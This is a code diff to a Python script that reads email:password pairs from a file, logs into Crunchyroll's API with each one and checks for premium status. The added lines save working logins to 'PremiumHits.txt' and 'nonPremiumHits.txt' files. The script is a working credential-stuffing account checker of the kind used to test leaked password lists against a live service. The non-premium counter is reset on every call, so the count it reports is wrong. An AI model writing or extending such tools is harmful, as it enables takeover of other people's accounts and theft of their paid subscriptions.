@@ -1,7 +1,10 @@
 import requests, os
 
 
+
 def test_account(email, password):
+    global nonpremiumCount
+    nonpremiumCount = 0
     user_login = requests.post(
         'https://beta-api.crunchyroll.com/auth/v1/token',
         {
@@ -48,25 +51,39 @@ def test_account(email, password):
 
     if benefits.status_code != 200 and benefits.json().get('code') == 'subscription.not_found':
         print(f'Account {email}:{password} - not premium')
+        nonpremiumCount = nonpremiumCount + 1
+        nonPremiumFile = open('nonPremiumHits.txt', 'a')
+        nonPremiumFile.write(f'{email}:{password}\n')
+        nonPremiumFile.close()
         return False
 
     benefits = benefits.json()
 
     if benefits.get('items')[0]['benefit'] == 'cr_premium':
         return True
-
     return False
 
 
 acc_file = open('accounts.txt', 'r', encoding="utf-8")
+
+
+global premiumCount
+
+
+
 if os.path.getsize('accounts.txt') > 0:
+    premiumCount = 0
     for line in acc_file.readlines():
         account_list = line.split(':')
         eml = account_list[0].strip()
         pwd = account_list[1].strip()
         if test_account(eml, pwd):
             print(f'Account {eml}:{pwd} - Premium account')
+            premiumCount = premiumCount + 1
+            premiumFile = open('PremiumHits.txt', 'a')
+            premiumFile.write(f'{eml}:{pwd}\n')
+            premiumFile.close()
 else:
     print("No accounts found, please add some accounts in accounts.txt file.")
 acc_file.close()
-print("\nScript finished")
+print(f"\nScript finished with {premiumCount} premiums and {nonpremiumCount} non premiums")
